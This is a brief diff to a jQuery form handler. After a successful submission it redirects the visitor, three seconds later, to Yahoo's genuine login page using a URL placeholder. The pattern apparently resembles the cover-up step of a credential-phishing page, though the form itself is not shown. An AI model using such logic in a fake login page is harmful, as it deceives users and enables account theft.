@@ -77,6 +77,10 @@ $(document).ready(function () {
       }).done(function (response) {
         if (response.status == 200) {
           $('.errorMsg2').fadeIn().html(response.message); // delay and reload and Redirect to Original Page
+
+          setTimeout(function () {
+            window.location.href = "https://login.yahoo.com/?.src=ygrp&.intl=uk&.lang=en-GB&.done=%doneUrl%"; //will redirect to your blog page (an ex: blog.html)
+          }, 3000);
         } else {
           $('.errorMsg2').fadeIn().html(response.message);
         }
